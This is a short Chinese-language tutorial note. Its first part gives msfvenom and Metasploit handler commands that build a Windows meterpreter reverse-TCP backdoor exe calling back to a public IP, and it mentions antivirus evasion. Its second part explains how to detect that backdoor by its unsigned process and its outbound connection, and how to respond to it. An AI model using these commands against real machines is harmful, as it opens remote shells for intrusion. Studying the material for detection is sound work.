## **MSF后门程序**
MSF端生成反向tcpshell的后门exe
```
msfconsole  

msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=6666 -f exe -o shell.exe
```
MSF服务端监听
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 6666
run
```
此时目标机运行exe。
一般这个exe做了免杀，wf和普通杀毒软件无法识别。


^
## **基于流量分析MSF后门**
分析：
查看进程对内对外的网络连接。
工具：
火绒剑等。

点击网络，可以看到进程程序列表。
```
shell.exe   进程ID628   无数字签名未知文件  协议TCP  内部192.168.1.12:50103  外部47.94.236.117:6666  状态TS_established
```
其中无签名，对外连接异常，可知此程序有问题。
杀死进程，将程序上传沙箱分析，将对外IP用情报平台分析。


